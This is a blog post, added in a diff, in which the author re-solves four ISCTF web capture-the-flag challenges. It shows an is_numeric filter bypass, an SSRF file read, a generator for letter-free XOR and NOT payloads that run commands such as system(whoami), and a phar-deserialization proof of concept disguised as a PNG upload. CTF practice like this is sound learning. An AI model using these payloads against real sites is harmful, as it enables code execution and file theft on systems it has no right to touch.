@@ -1,0 +1,1420 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="isctf-web复现, Made by jcxj">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>isctf-web复现 | Made by jcxj</title>
+    <link rel="icon" type="image/png" href="/jcxj/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/css/my.css">
+
+    <script src="/jcxj/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/jcxj/" class="waves-effect waves-light">
+                    
+                    <img src="/jcxj/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Made by jcxj</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/jcxj/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Made by jcxj</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/11.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">isctf-web复现</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/jcxj/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/jcxj/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-11-08
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-11-09
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    8 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/jcxj/libs/prism/prism.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="1-simple-php源码"><a href="#1-simple-php源码" class="headerlink" title="1.simple-php源码"></a>1.simple-php源码</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+highlight_file(__FILE__);
+error_reporting(E_ERROR);
+
+$str&#x3D;$_GET[&#39;str&#39;];
+
+$pattern &#x3D; &quot;#\\\\\\\\&#x2F;Ilikeisctf#&quot;;
+function filter($num)&#123;
+    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);
+    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);
+    return $num;
+&#125;
+
+if(preg_match($pattern,$str,$arr))
+&#123;
+    echo &quot;good try!&quot;;
+    $num&#x3D;$_GET[&#39;num&#39;];
+    var_dump($num);
+    var_dump(is_numeric($num));
+    var_dump($num!&#x3D;&#x3D;&#39;36&#39;);
+    var_dump(trim($num)!&#x3D;&#x3D;&#39;36&#39;);
+    var_dump(filter($num));
+    var_dump(filter($num)&#x3D;&#x3D;&#39;36&#39;);
+    if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;
+        echo &quot;come on!!!&quot;;
+        if($num&#x3D;&#x3D;&#39;36&#39;&amp;isset($_GET[&#39;cmd&#39;]))&#123;
+
+                eval($_GET[&#39;cmd&#39;]);
+
+
+
+        &#125;else&#123;
+            echo &quot;hacker!!&quot;;
+        &#125;
+    &#125;else&#123;
+        echo &quot;hacker!!!&quot;;
+    &#125;
+
+
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><pre class="line-numbers language-none"><code class="language-none">1.先要解决pattern的问题即
+if(preg_match($pattern,$str,$arr))
+str&#x3D;pattern
+这个很简单,把代码放在本地,然后echo $pattern;即可
+2.解决num的判断
+is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;
+is_numeric($num) 判断是否数字或者数字字符串
+trim($num) 去掉首尾空格
+filter($num) 这个函数是自己写的,作用是把某些特定字符转变为1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">解决方案: %0c36
+is_numeric常见绕过: %0c , 十六进制绕过 , %00绕过(前后都可以) , %20(只能放在数字后)
+由于有trim()因此不能用%20,有filter()不能用%00和十六进制
+因此只能用36a有不符合
+#为什么%0c可以而%0a,%0b,%0d不行????
+#%0c会被解析成存在的特殊字符,如下图中的一个箭头
+#%0a,%20会被解析成空格,过不了trim($num)!&#x3D;&#x3D;&#39;36&#39;
+#%0c只能放前面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221108211902920.png" class="" title="image-20221108211902920">
+
+<h3 id="2-curl"><a href="#2-curl" class="headerlink" title="2.curl"></a>2.curl</h3><p>这题其实做出来了,但被返回的东西误导了</p>
+<p>拿到页面后f12看源码</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!--
+if(isset($_GET[&#39;urls&#39;]))&#123;
+	$urls &#x3D; $_GET[&#39;urls&#39;];
+	$url_host &#x3D; parse_url($urls,PHP_URL_HOST);
+	&#x2F;&#x2F;Do something~~~~
+	curl_get($urls);
+&#125;
+--&gt;
+非常明显的ssrf,根据提示,flag在flag.php里<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221108213438080.png" class="" title="image-20221108213438080">
+
+<pre class="line-numbers language-none"><code class="language-none">urls&#x3D;file:&#x2F;&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221108213522169.png" class="" title="image-20221108213522169">
+
+<pre class="line-numbers language-none"><code class="language-none">7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221108213555887.png" class="" title="image-20221108213555887">
+
+<h3 id="3-无字符rce"><a href="#3-无字符rce" class="headerlink" title="3.无字符rce"></a>3.无字符rce</h3><p>异或法</p>
+<pre class="line-numbers language-none"><code class="language-none">#异或脚本
+import requests
+import urllib
+import re
+
+# 生成可用的字符
+def general_rce():
+    result &#x3D; &#39;&#39;
+    preg &#x3D; &#39;[a-zA-Z0-9]&#39;
+    for i in range(256):
+        for j in range(256):
+            if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):
+                x &#x3D; i ^ j
+                if x &gt;&#x3D; 32 and x &lt;&#x3D; 126:
+                    a &#x3D; &#39;%&#39; + hex(i)[2:].zfill(2)
+                    b &#x3D; &#39;%&#39; + hex(j)[2:].zfill(2)
+                    result +&#x3D; (chr(x) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)
+    f &#x3D; open(&#39;xor_rce.txt&#39;, &#39;w&#39;)
+    f.write(result)
+
+# 根据输入的命令在生成的txt中进行匹配
+def action(arg):
+    s1 &#x3D; &quot;&quot;
+    s2 &#x3D; &quot;&quot;
+    for i in arg:
+        f &#x3D; open(&quot;xor_rce.txt&quot;, &quot;r&quot;)
+        while True:
+            t &#x3D; f.readline()
+            if t &#x3D;&#x3D; &#39;&#39;:
+                break
+            if t[0] &#x3D;&#x3D; i:
+                s1 +&#x3D; t[2:5]
+                s2 +&#x3D; t[6:9]
+                break
+        f.close()
+    output &#x3D; (&quot;((\&quot;&quot; + s1 + &quot;\&quot;)&quot; + &quot;^&quot; + &quot;(\&quot;&quot; + s2 + &quot;\&quot;))&quot;)
+    return output
+
+def main():
+    #general_rce()
+    while True:
+        s1 &#x3D; input(&quot;\n[+] your function: &quot;)
+        if s1 &#x3D;&#x3D; &quot;exit&quot;:
+            break
+        s2 &#x3D; input(&quot;[+] your command: &quot;)
+        param &#x3D; action(s1) + action(s2)
+        print(&quot;\n result: \n&quot; + param)
+#需要注意的是php5不支持这种表达式
+#报错如下: Parse error: syntax error, unexpected &#39;(&#39; in &#x2F;www&#x2F;wwwroot&#x2F;124.223.91.80&#x2F;rce&#x2F;yihuo2.php(10) : eval()&#39;d code on line 1
+#php7的可以
+main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>取反法</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+
+$b&#x3D;urlencode(~&#39;ls&#39;);
+var_dump($b);
+#phpinfo() -&gt;(~%8F%97%8F%96%91%99%90)();
+#eval($_POST[1]) -&gt; (~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
+#system(whoami) -&gt; (~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
+#system(ls) -&gt; (~%8C%86%8C%8B%9A%92)(~%93%8C);
+
+这道题用不了,但我放在本地就能用,可能是哪个选项被关了吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="4-phar协议结合反序列化"><a href="#4-phar协议结合反序列化" class="headerlink" title="4.phar协议结合反序列化"></a>4.phar协议结合反序列化</h3><pre class="line-numbers language-none"><code class="language-none">源码分析: 
+index.php
+&lt;?php
+include(&quot;class.php&quot;);
+if(isset($_GET[&#39;img_name&#39;]))&#123;
+$down &#x3D; new check_img();
+echo $down-&gt;img_check();
+&#125;
+if(isset($_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;
+$up &#x3D; new upload();
+echo $up-&gt;start();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">class.php
+&lt;?php
+class upload&#123;
+    public $filename;
+    public $ext;
+    public $size;
+    public $Valid_ext;
+
+    public function __construct()&#123;
+        $this-&gt;filename &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];
+        $this-&gt;ext &#x3D; end(explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]));
+        $this-&gt;size &#x3D; $_FILES[&quot;file&quot;][&quot;size&quot;] &#x2F; 1024;
+        $this-&gt;Valid_ext &#x3D; array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);
+    &#125;
+
+    public function start()&#123;
+        return $this-&gt;check();
+    &#125;
+
+    private function check()&#123;
+        if(file_exists($this-&gt;filename))&#123;
+            return &quot;Image already exsists&quot;;
+        &#125;elseif(!in_array($this-&gt;ext, $this-&gt;Valid_ext))&#123;
+            return &quot;Only Image Can Be Uploaded&quot;;
+        &#125;else&#123;
+            return $this-&gt;move();
+        &#125;
+    &#125;
+
+    private function move()&#123;
+        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload&#x2F;&quot;.$this-&gt;filename);
+        return &quot;Upload succsess!&quot;;
+    &#125;
+
+    public function __wakeup()&#123;
+        echo file_get_contents($this-&gt;filename);
+    &#125;
+&#125;
+
+
+class check_img&#123;
+    public $img_name;
+    public function __construct()&#123;
+        $this-&gt;img_name &#x3D; $_GET[&#39;img_name&#39;];
+    &#125;
+
+    public function img_check()&#123;
+        if(file_exists($this-&gt;img_name))&#123;
+            return &quot;Image exsists&quot;;
+        &#125;else&#123;
+            return &quot;Image not exsists&quot;;
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关注到 check_img中的file_exists()中的参数是我们可以控制的(该参数和include()一样),因此考虑phar反序列化</p>
+<pre class="line-numbers language-none"><code class="language-none">注意：复现phar反序列化的时候要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。
+#流程: 在本地写好php文件,利用这个php文件生成shell.phar文件,再将生成的shell.phar改名为shell.png
+将这个shell.png上传后,利用phar:&#x2F;&#x2F;shell.png去读取该文件,触发反序列化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">poc1.php 
+&lt;?php
+class upload&#123;
+#这里的upload类需要和源代码中的类一致,变量名看情况
+    public $filename&#x3D;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&quot;;
+&#125;
+
+$o &#x3D; new upload();
+#下面这些代码可以理解为固定格式,不用去修改
+@unlink(&quot;shell.phar&quot;);
+$phar &#x3D; new Phar(&quot;shell.phar&quot;); &#x2F;&#x2F;后缀名必须为phar
+$phar-&gt;startBuffering();
+#如果有文件头检验,这里可以改成  $phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub
+$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件
+&#x2F;&#x2F;签名自动计算
+$phar-&gt;stopBuffering();
+#file_exists() 函数判断了shell.jpg文件是否存在,进而触发了他生成一个新文件shell.phar
+#然后我们可以用phar:&#x2F;&#x2F;shell.phar&#x2F;test.txt来访问其中的内容
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>去页面中访问一下poc1.php</p>
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221109195636552.png" class="" title="image-20221109195636552">
+
+<p>会显示空白,但没关系,在我们的文件夹下已经自动生成了一个shell.phar文件</p>
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221109195654563.png" class="" title="image-20221109195654563">
+
+<pre class="line-numbers language-none"><code class="language-none">上传文件的时候把shell.phar 改成shell.png 即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221109195823780.png" class="" title="image-20221109195823780">
+
+<pre class="line-numbers language-none"><code class="language-none">利用文件包含+phar协议去访问<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221109195912952.png" class="" title="image-20221109195912952">
+
+<pre class="line-numbers language-none"><code class="language-none">成功拿到flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2022/11/08/isctf-web-fu-xian/image-20221109195946138.png" class="" title="image-20221109195946138">
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/jcxj/about" rel="external nofollow noreferrer">jcxj</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jcxj.github.io/jcxj/jcxj/2022/11/08/isctf-web-fu-xian/">https://jcxj.github.io/jcxj/jcxj/2022/11/08/isctf-web-fu-xian/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/jcxj/about" target="_blank">jcxj</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/jcxj/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/jcxj/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/jcxj/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">有没有好心人(dayuanzhong)v_me_50</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/jcxj/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/jcxj/medias/reward/wechat1.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/jcxj/2022/11/09/isctf-easy-ret2libc/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/jcxj/medias/featureimages/22.jpg" class="responsive-img" alt="isctf-easy_ret2libc">
+                        
+                        <span class="card-title">isctf-easy_ret2libc</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-09
